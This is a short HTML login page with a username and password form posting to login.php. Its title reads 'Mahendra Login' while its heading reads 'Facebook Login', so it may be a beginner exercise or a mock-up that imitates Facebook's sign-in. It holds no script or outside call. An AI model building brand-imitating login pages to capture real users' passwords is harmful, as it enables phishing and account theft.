<!DOCTYPE html>
<html>
<head>
    <title>Mahendra Login</title>
    <link rel="stylesheet" href="styles.css"> </head>
<body>
    <div class="login-container">
        <h1>Facebook Login</h1>
        <form action="login.php" method="post">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>
            <br>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>
            <br>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
